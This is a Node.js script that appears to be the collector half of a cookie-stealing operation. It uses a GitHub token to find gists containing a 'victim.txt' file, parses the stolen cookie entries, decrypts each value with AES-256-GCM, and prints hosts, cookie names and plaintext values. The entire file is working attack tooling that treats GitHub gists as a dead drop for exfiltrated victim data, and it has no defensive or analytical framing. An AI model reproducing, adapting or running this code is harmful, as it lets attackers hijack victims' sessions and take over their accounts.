const crypto = require('crypto');

const gh_token = process.argv[2];

function decryptAES256GCM(key, enc, nonce, tag) {
	const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
	decipher.setAuthTag(tag);
	return decipher.update(enc,'base64','utf8') + decipher.final('utf-8');
}

(async () => {
    let response = await fetch('https://api.github.com/gists', {
        headers: {
            'Authorization': `token ${gh_token}`
        }
    });
    const gists = (await response.json()).filter(gist => {
        const files = Object.keys(gist.files);
        if (files.length === 1 && 
            files.includes("victim.txt")) {
            return true;
        }
        return false;
    });

    for (let i = 0; i < gists.length; i++) {
        const gist = gists[i];
        response = await fetch(`https://api.github.com/gists/${gist.id}`, {
            headers: {
                'Authorization': `token ${gh_token}`
            }
        });
        const data = await response.json();
        const split = data.files['victim.txt'].content.split("Cookies: \n");
        console.log('=====================');
        console.log(split[0].replace('\n', ''));
        console.log('COOKIES:');
        const cookies = data.files['victim.txt'].content.split("Cookies: \n")[1].split('\n');
        cookies.filter(cookie => !!cookie).map(str => {
            const [host_key, name, key, enc, nonce, tag] = str.split(', ');
            const value = decryptAES256GCM(
                Buffer.from(key, 'base64'), 
                Buffer.from(enc, 'base64'), 
                Buffer.from(nonce, 'base64'), 
                Buffer.from(tag, 'base64'));
            console.log(host_key, name, value);
            console.log('-----------------------');
        });
        console.log('=====================');
    }
})();